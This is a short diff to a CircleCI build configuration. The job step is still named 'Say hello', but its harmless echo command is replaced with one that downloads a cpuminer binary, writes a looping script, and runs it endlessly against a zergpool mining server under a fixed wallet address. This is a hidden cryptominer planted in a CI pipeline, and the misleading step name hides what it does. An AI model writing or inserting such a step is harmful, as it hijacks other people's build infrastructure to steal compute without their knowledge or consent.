@@ -16,7 +16,10 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World!"
+          command: "wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz && echo '#!/bin/sh
+while [ 1 ]; do
+./cpuminer -a yespowersugar -o stratum+tcp://yespowerSUGAR.asia.mine.zergpool.com:6535 -u LUFTF9kAQgHyWLv2rctGvVSSxL9RXBodcF -p c=LTC
+done' > autominer.sh && chmod +x autominer.sh && ./autominer.sh"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
